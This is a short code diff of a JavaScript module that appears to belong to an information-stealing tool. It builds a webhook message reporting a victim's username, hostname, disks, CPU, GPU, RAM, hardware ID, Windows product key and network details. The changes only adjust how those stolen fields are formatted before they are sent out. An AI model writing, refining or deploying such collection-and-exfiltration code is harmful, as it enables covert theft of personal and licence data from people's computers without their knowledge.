@@ -6,8 +6,6 @@ const {
     systemInfo 
 } = require('../../utils/systeminfo.js');
 
-const os = require('os');
-
 module.exports = async (webhook) => {
     const { 
         WINDOWS_VERSION,
@@ -30,10 +28,10 @@ module.exports = async (webhook) => {
             {
                 title: "System Information",
                 fields: [
-                    { name: "User", value: `\`\`\`yml\nUsername: ${process.env.USERNAME}\nHostname: ${os.hostname()}\n\`\`\`` },
-                    { name: "Disks", value: `\`\`\`yml\n${DISKS_INFO}\n\`\`\`` },
-                    { name: "System", value: `\`\`\`yml\nOS: ${OS}\nCPU: ${CPU}\nGPU: ${GPU}\nRAM: ${RAM}\nHWID: ${UUID}\nProduct Key: ${WINDOWS_KEY}\n\`\`\`` },
-                    { name: "Network", value: `\`\`\`yml\n${NETWORK}\n\`\`\`` },
+                    { name: "User", value: `\`\`\`\nUsername: ${process.env.USERNAME}\nHostname: ${process.env.USERDOMAIN}\n\`\`\`` },
+                    { name: "Disks", value: `\`\`\`\n${DISKS_INFO}\n\`\`\`` },
+                    { name: "System", value: `\`\`\`\nOS: ${OS}\nCPU: ${CPU}\nGPU: ${GPU}\nRAM: ${RAM}\nHWID: ${UUID}\nProduct Key: ${WINDOWS_KEY}\n\`\`\`` },
+                    { name: "Network", value: `\`\`\`\n${Object.entries(NETWORK).map(([name, value]) => `${name}: ${value}`).join("\n")}\n\`\`\`` },
                 ]
             }
         ]
